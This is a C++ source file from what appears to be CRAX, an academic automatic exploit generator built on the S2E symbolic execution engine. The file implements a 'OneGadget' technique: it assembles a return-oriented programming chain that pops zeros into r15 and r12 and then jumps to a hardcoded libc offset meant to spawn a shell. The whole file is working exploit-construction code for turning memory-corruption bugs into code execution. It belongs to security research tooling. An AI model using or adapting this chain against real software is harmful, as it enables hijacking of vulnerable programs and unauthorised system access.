// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>

#include <cassert>

#include "OneGadget.h"

namespace s2e::plugins::crax {

OneGadget::OneGadget() : Technique() {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &libc = exploit.getLibc();

    // XXX: Parse the output of one_gadget.
    m_requiredGadgets.push_back(std::make_pair(&libc, "pop r15 ; ret"));
    m_requiredGadgets.push_back(std::make_pair(&libc, "pop r12 ; ret"));
}


void OneGadget::initialize() {
    resolveRequiredGadgets();
}

bool OneGadget::checkRequirements() const {
    return Technique::checkRequirements();
}

std::vector<RopSubchain> OneGadget::getRopSubchains() const {
    Exploit &exploit = g_crax->getExploit();
    ELF &libc = exploit.getLibc();

    // XXX: Parse the output of one_gadget.
    return {{
        ConstantExpr::create(0, Expr::Int64),  // RBP
        BaseOffsetExpr::create(exploit, libc, Exploit::toVarName("pop r15 ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create(exploit, libc, Exploit::toVarName("pop r12 ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create(libc, 0xe6c7e)
    }};
}

RopSubchain OneGadget::getExtraRopSubchain() const {
    return {};
}

}  // namespace s2e::plugins::crax
